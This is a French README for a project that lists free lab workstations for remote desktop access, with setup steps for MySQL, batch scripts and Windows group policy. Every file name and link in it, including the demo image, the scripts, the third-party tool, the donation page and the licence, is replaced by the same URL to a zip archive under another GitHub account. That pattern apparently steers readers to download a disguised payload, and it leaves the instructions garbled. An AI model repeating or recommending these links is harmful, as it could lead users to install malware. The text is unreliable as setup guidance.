...
* Un site web sur lequel est affichée une liste des postes disponibles.
  ![démo](https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip)
...
2. Créez un compte utilisateur et une base de données dans MySQL (vous pouvez importer le fichier `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip` pour créer la structure de la table).
3. Ajoutez dans votre table les noms des postes de travail de votre laboratoire à rendre disponible sur le site web.
4. Configurez la ligne de connexion MySQL `$bdd` et les autres variables disponibles dans le fichier `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`.

## Postes de travail
1.	Configurez les scripts du dossier `Station` :
    * `set ServerURL` (dans `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip` et `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`) : inscrivez l’URL vers le `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip` du serveur web.
    * `set RDPusers` (dans `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`) : le nom du groupe du domaine des utilisateurs autorisés à se connecter à ajouter dans le groupe standard `Utilisateurs du Bureau à distance`.
    * `set RDPLocalGroup` (dans `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`) : si vous utilisez des postes dans une autre langue que le français, inscrivez le nom du groupe équivalent à `Utilisateurs du Bureau à distance`.
    * `set endRDPTime[i]` et `set startRDPTime[i]` (dans `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`) : 
...
2. Sur chaque poste :
    ...
    3. Inscrivez le script Batch de "service" dans le Planificateur de tâche à l’aide du script `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`.
    4. Activez les scripts événementiels via les GPO domaine ou local (`https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`) suivants :
       * Si ce n’est déjà fait, [désactivez le délai pour l’exécution des scripts](https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip).
       * `Configuration de l'ordinateur\Paramètres Windows\Scripts (démarrage/arrêt)\Démarrage` : exécuter `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`.
       * `Configuration de l'ordinateur\Paramètres Windows\Scripts (démarrage/arrêt)\Arrêt du système` : exécuter `https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip`.

Quelques recommandations supplémentaires, mais facultatives :
1. Mettez en place un mécanisme pour fermer automatiquement les sessions abandonnées, par exemple avec [Lithnet Idle Logoff](https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip).
2. Mettez en place un mécanisme pour redémarrer les postes éteints (Wake-On-Lan ou [planifiez un démarrage automatique par le BIOS sur les appareils HP](https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip)).
...
Vous pouvez vous inspirer de la [documentation à l'intention de nos utilisateurs](https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip+d%27informatique+virtuel).

# Nous remercier?
Ce projet vous a été utile et vous souhaitez nous remercier? [Contribuez aux Bourses aux étudiants de l'EBSI ou au fonds des Amis de l'EBSI](https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip). Merci à l’avance!
...
# Licence
https://raw.githubusercontent.com/r2hloveu/IsThereAnyFreeDesktop/main/src/Any-Free-There-Is-Desktop-v2.6.zip